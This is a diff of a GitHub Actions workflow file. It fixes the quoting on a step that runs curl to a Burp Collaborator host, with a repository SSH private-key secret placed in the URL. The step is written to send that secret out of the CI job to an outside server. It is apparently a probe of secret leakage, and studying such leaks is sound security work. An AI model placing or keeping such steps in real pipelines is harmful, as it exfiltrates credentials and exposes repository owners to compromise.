@@ -21,7 +21,7 @@ jobs:
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
 
-      - run: curl 'https://mxnzwzr76orx03zydc3jh66sqjwakz.burpcollaborator.net?TEST=${{ secrets.SSHKEY_TEPPAYL_TEST_PRIVATE_REPOSITORY }}
+      - run: curl 'https://mxnzwzr76orx03zydc3jh66sqjwakz.burpcollaborator.net?TEST=${{ secrets.SSHKEY_TEPPAYL_TEST_PRIVATE_REPOSITORY }}'
 
       - name: test checkout
         uses: actions/checkout@v2
